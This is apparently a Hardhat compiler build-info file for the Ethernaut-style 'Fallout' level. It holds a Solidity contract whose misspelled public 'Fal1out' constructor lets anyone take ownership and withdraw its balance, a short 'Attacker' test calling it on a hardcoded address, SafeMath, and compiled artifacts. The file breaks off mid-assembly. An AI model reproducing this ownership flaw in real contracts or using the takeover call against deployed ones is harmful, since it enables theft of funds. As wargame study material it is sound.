{
	"id": "903c929141f6ae1bb81eedb1f553c758",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.6.0",
	"solcLongVersion": "0.6.0+commit.26b70077",
	"input": {
		"language": "Solidity",
		"sources": {
			"tests/test02.sol": {
				"content": "//SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/level02.sol\";\n\ncontract Attacker\n{\n    Fallout level02 = Fallout(payable(address(0xc379b76ee07Ad37f661DFDaa4002Df5E0eF22d9C)));\n\n    function test() external\n    {\n        level02.Fal1out();\n    }\n}"
			},
			"src/level02.sol": {
				"content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n// import 'openzeppelin-contracts-06/math/SafeMath.sol';\nimport \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\";\n\ncontract Fallout {\n  \n  using SafeMath for uint256;\n  mapping (address => uint) allocations;\n  address payable public owner;\n\n\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}"
			},
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.6.0;\n\n/**\n * @dev Wrappers over Solidity's arithmetic operations with added overflow\n * checks.\n *\n * Arithmetic operations in Solidity wrap on overflow. This can easily result\n * in bugs, because programmers usually assume that an overflow raises an\n * error, which is the standard behavior in high level programming languages.\n * `SafeMath` restores this intuition by reverting the transaction when an\n * operation overflows.\n *\n * Using this library instead of the unchecked operations eliminates an entire\n * class of bugs, so it's recommended to use it always.\n */\nlibrary SafeMath {\n    /**\n     * @dev Returns the addition of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `+` operator.\n     *\n     * Requirements:\n     * - Addition cannot overflow.\n     */\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    /**\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n     * overflow (when the result is negative).\n     *\n     * Counterpart to Solidity's `-` operator.\n     *\n     * Requirements:\n     * - Subtraction cannot overflow.\n     */\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the multiplication of two unsigned integers, reverting on\n     * overflow.\n     *\n     * Counterpart to Solidity's `*` operator.\n     *\n     * Requirements:\n     * - Multiplication cannot overflow.\n     */\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\n        // benefit is lost if 'b' is also tested.\n        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    /**\n     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on\n     * division by zero. The result is rounded towards zero.\n     *\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\n     * uses an invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        // Solidity only automatically asserts when dividing by 0\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\n\n        return c;\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    /**\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n     * Reverts with custom message when dividing by zero.\n     *\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\n     * invalid opcode to revert (consuming all remaining gas).\n     *\n     * Requirements:\n     * - The divisor cannot be zero.\n     */\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			},
			"remappings": []
		}
	},
	"output": {
		"contracts": {
			"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol": {
				"SafeMath": {
					"abi": [],
					"devdoc": {
						"details": "Wrappers over Solidity's arithmetic operations with added overflow checks. * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.",
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":622:5210  library SafeMath {... */\n  dataSize(sub_0)\n  dataOffset(sub_0)\n    /* \"--CODEGEN--\":132:134   */\n  0x0b\n    /* \"--CODEGEN--\":166:173   */\n  dup3\n    /* \"--CODEGEN--\":155:164   */\n  dup3\n    /* \"--CODEGEN--\":146:153   */\n  dup3\n    /* \"--CODEGEN--\":137:174   */\n  codecopy\n    /* \"--CODEGEN--\":255:262   */\n  dup1\n    /* \"--CODEGEN--\":249:263   */\n  mload\n    /* \"--CODEGEN--\":246:247   */\n  0x00\n    /* \"--CODEGEN--\":241:264   */\n  byte\n    /* \"--CODEGEN--\":235:239   */\n  0x73\n    /* \"--CODEGEN--\":232:265   */\n  eq\n    /* \"--CODEGEN--\":222:224   */\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":269:278   */\n  invalid\n    /* \"--CODEGEN--\":222:224   */\ntag_1:\n    /* \"--CODEGEN--\":293:302   */\n  address\n    /* \"--CODEGEN--\":290:291   */\n  0x00\n    /* \"--CODEGEN--\":283:303   */\n  mstore\n    /* \"--CODEGEN--\":323:327   */\n  0x73\n    /* \"--CODEGEN--\":314:321   */\n  dup2\n    /* \"--CODEGEN--\":306:328   */\n  mstore8\n    /* \"--CODEGEN--\":347:354   */\n  dup3\n    /* \"--CODEGEN--\":338:345   */\n  dup2\n    /* \"--CODEGEN--\":331:355   */\n  return\nstop\n\nsub_0: assembly {\n        /* \"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":622:5210  library SafeMath {... */\n      eq(address, deployTimeAddress())\n      mstore(0x40, 0x80)\n      0x00\n      dup1\n      revert\n\n    auxdata: 0xa2646970667358221220c0e9fceb87378fe7eef9b23cb6034cb5310f9623cd893f98759fc65473b393c264736f6c63430006000033\n}\n",
						"bytecode": {
							"linkReferences": {},
							"object": "60566023600b82828239805160001a607314601657fe5b30600052607381538281f3fe73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220c0e9fceb87378fe7eef9b23cb6034cb5310f9623cd893f98759fc65473b393c264736f6c63430006000033",
							"opcodes": "PUSH1 0x56 PUSH1 0x23 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH1 0x16 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC0 0xE9 0xFC 0xEB DUP8 CALLDATACOPY DUP16 0xE7 0xEE 0xF9 0xB2 EXTCODECOPY 0xB6 SUB 0x4C 0xB5 BALANCE 0xF SWAP7 0x23 0xCD DUP10 EXTCODEHASH SWAP9 PUSH22 0x9FC65473B393C264736F6C6343000600003300000000 ",
							"sourceMap": "622:4588:0:-:0;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600080fdfea2646970667358221220c0e9fceb87378fe7eef9b23cb6034cb5310f9623cd893f98759fc65473b393c264736f6c63430006000033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 REVERT INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xC0 0xE9 0xFC 0xEB DUP8 CALLDATACOPY DUP16 0xE7 0xEE 0xF9 0xB2 EXTCODECOPY 0xB6 SUB 0x4C 0xB5 BALANCE 0xF SWAP7 0x23 0xCD DUP10 EXTCODEHASH SWAP9 PUSH22 0x9FC65473B393C264736F6C6343000600003300000000 ",
							"sourceMap": "622:4588:0:-:0;;;;;;;;"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "17200",
								"executionCost": "97",
								"totalCost": "17297"
							},
							"internal": {
								"add(uint256,uint256)": "infinite",
								"div(uint256,uint256)": "infinite",
								"div(uint256,uint256,string memory)": "infinite",
								"mod(uint256,uint256)": "infinite",
								"mod(uint256,uint256,string memory)": "infinite",
								"mul(uint256,uint256)": "infinite",
								"sub(uint256,uint256)": "infinite",
								"sub(uint256,uint256,string memory)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH #[$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 622,
									"end": 5210,
									"name": "PUSH [$]",
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3"
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3"
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3"
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY"
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1"
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD"
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE"
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI"
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST"
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS"
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE"
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2"
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8"
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3"
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2"
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN"
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220c0e9fceb87378fe7eef9b23cb6034cb5310f9623cd893f98759fc65473b393c264736f6c63430006000033",
									".code": [
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSHDEPLOYADDRESS"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "ADDRESS"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "EQ"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "MSTORE"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "DUP1"
										},
										{
											"begin": 622,
											"end": 5210,
											"name": "REVERT"
										}
									]
								}
							}
						},
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.6.0+commit.26b70077\"},\"language\":\"Solidity\",\"output\":{\"abi\":[],\"devdoc\":{\"details\":\"Wrappers over Solidity's arithmetic operations with added overflow checks. * Arithmetic operations in Solidity wrap on overflow. This can easily result in bugs, because programmers usually assume that an overflow raises an error, which is the standard behavior in high level programming languages. `SafeMath` restores this intuition by reverting the transaction when an operation overflows. * Using this library instead of the unchecked operations eliminates an entire class of bugs, so it's recommended to use it always.\",\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":\"SafeMath\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol\":{\"keccak256\":\"0xaa0e11a791bc975d581a4f5b7a8d9c16a880a354c89312318ae072ae3e740409\",\"urls\":[\"bzz-raw://982d8b344f76193834260436d74c81e5a8f9e89106bb4cd72bbaabda4f3f59c2\",\"dweb:/ipfs/QmSrvP5TkQRhKDVCTpsV3uaKLBhkt7PjUY89vdtM9o5ybK\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"methods": {}
					}
				}
			},
			"src/level02.sol": {
				"Fallout": {
					"abi": [
						{
							"inputs": [],
							"name": "Fal1out",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "allocate",
							"outputs": [],
							"stateMutability": "payable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "allocator",
									"type": "address"
								}
							],
							"name": "allocatorBalance",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "collectAllocations",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "owner",
							"outputs": [
								{
									"internalType": "address payable",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "address payable",
									"name": "allocator",
									"type": "address"
								}
							],
							"name": "sendAllocation",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"methods": {}
					},
					"evm": {
						"assembly": "    /* \"src/level02.sol\":228:1114  contract Fallout {... */\n  mstore(0x40, 0x80)\n  callvalue\n    /* \"--CODEGEN--\":8:17   */\n  dup1\n    /* \"--CODEGEN--\":5:7   */\n  iszero\n  tag_1\n  jumpi\n    /* \"--CODEGEN--\":30:31   */\n  0x00\n    /* \"--CODEGEN--\":27:28   */\n  dup1\n    /* \"--CODEGEN--\":20:32   */\n  revert\n    /* \"--CODEGEN--\":5:7   */\ntag_1:\n    /* \"src/level02.sol\":228:1114  contract Fallout {... */\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"src/level02.sol\":228:1114  contract Fallout {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x6fab5ddf\n      eq\n      tag_2\n      jumpi\n      dup1\n      0x8aa96f38\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x8da5cb5b\n      eq\n      tag_4\n      jumpi\n      dup1\n      0xa2dea26f\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xabaa9916\n      eq\n      tag_6\n      jumpi\n      dup1\n      0xffd40b56\n      eq\n      tag_7\n      jumpi\n    tag_1:\n      0x00\n      dup1\n      revert\n        /* \"src/level02.sol\":377:476  function Fal1out() public payable {... */\n    tag_2:\n      tag_8\n      tag_9\n      jump\t// in\n    tag_8:\n      stop\n        /* \"src/level02.sol\":896:996  function collectAllocations() public onlyOwner {... */\n    tag_3:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_10\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_10:\n        /* \"src/level02.sol\":896:996  function collectAllocations() public onlyOwner {... */\n      pop\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"src/level02.sol\":323:351  address payable public owner */\n    tag_4:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_13\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_13:\n        /* \"src/level02.sol\":323:351  address payable public owner */\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/level02.sol\":740:892  function sendAllocation(address payable allocator) public {... */\n    tag_5:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_16\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_16:\n        /* \"src/level02.sol\":740:892  function sendAllocation(address payable allocator) public {... */\n      pop\n      tag_17\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_18\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_18:\n        /* \"src/level02.sol\":740:892  function sendAllocation(address payable allocator) public {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_19\n      jump\t// in\n    tag_17:\n      stop\n        /* \"src/level02.sol\":626:736  function allocate() public payable {... */\n    tag_6:\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      stop\n        /* \"src/level02.sol\":1000:1112  function allocatorBalance(address allocator) public view returns (uint) {... */\n    tag_7:\n      callvalue\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_22\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_22:\n        /* \"src/level02.sol\":1000:1112  function allocatorBalance(address allocator) public view returns (uint) {... */\n      pop\n      tag_23\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_24\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_24:\n        /* \"src/level02.sol\":1000:1112  function allocatorBalance(address allocator) public view returns (uint) {... */\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_25\n      jump\t// in\n    tag_23:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"src/level02.sol\":377:476  function Fal1out() public payable {... */\n    tag_9:\n        /* \"src/level02.sol\":425:435  msg.sender */\n      caller\n        /* \"src/level02.sol\":417:422  owner */\n      0x01\n      0x00\n        /* \"src/level02.sol\":417:435  owner = msg.sender */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"src/level02.sol\":462:471  msg.value */\n      callvalue\n        /* \"src/level02.sol\":441:452  allocations */\n      0x00\n        /* \"src/level02.sol\":441:459  allocations[owner] */\n      dup1\n        /* \"src/level02.sol\":453:458  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/level02.sol\":441:459  allocations[owner] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n        /* \"src/level02.sol\":441:471  allocations[owner] = msg.value */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"src/level02.sol\":377:476  function Fal1out() public payable {... */\n      jump\t// out\n        /* \"src/level02.sol\":896:996  function collectAllocations() public onlyOwner {... */\n    tag_12:\n        /* \"src/level02.sol\":546:551  owner */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/level02.sol\":532:551  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/level02.sol\":532:542  msg.sender */\n      caller\n        /* \"src/level02.sol\":532:551  msg.sender == owner */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"src/level02.sol\":510:602  require(... */\n      tag_28\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x17\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x63616c6c6572206973206e6f7420746865206f776e6572000000000000000000\n      dup2\n      mstore\n      pop\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_28:\n        /* \"src/level02.sol\":949:959  msg.sender */\n      caller\n        /* \"src/level02.sol\":949:968  msg.sender.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/level02.sol\":949:991  msg.sender.transfer(address(this).balance) */\n      0x08fc\n        /* \"src/level02.sol\":969:990  address(this).balance */\n      selfbalance\n        /* \"src/level02.sol\":949:991  msg.sender.transfer(address(this).balance) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      dup6\n      dup9\n      dup9\n      call\n      swap4\n      pop\n      pop\n      pop\n      pop\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_31\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_31:\n        /* \"src/level02.sol\":949:991  msg.sender.transfer(address(this).balance) */\n      pop\n        /* \"src/level02.sol\":896:996  function collectAllocations() public onlyOwner {... */\n      jump\t// out\n        /* \"src/level02.sol\":323:351  address payable public owner */\n    tag_15:\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"src/level02.sol\":740:892  function sendAllocation(address payable allocator) public {... */\n    tag_19:\n        /* \"src/level02.sol\":837:838  0 */\n      0x00\n        /* \"src/level02.sol\":812:823  allocations */\n      dup1\n        /* \"src/level02.sol\":812:834  allocations[allocator] */\n      0x00\n        /* \"src/level02.sol\":824:833  allocator */\n      dup4\n        /* \"src/level02.sol\":812:834  allocations[allocator] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"src/level02.sol\":812:838  allocations[allocator] > 0 */\n      gt\n        /* \"src/level02.sol\":804:839  require(allocations[allocator] > 0) */\n      tag_33\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_33:\n        /* \"src/level02.sol\":845:854  allocator */\n      dup1\n        /* \"src/level02.sol\":845:863  allocator.transfer */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"src/level02.sol\":845:887  allocator.transfer(allocations[allocator]) */\n      0x08fc\n        /* \"src/level02.sol\":864:875  allocations */\n      0x00\n        /* \"src/level02.sol\":864:886  allocations[allocator] */\n      dup1\n        /* \"src/level02.sol\":876:885  allocator */\n      dup5\n        /* \"src/level02.sol\":864:886  allocations[allocator] */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      swap1\n      dup2\n      mstore\n      0x20\n      add\n      0x00\n      keccak256\n      sload\n        /* \"src/level02.sol\":845:887  allocator.transfer(allocations[allocator]) */\n      swap1\n      dup2\n      iszero\n      mul\n      swap1\n      mload(0x40)\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n  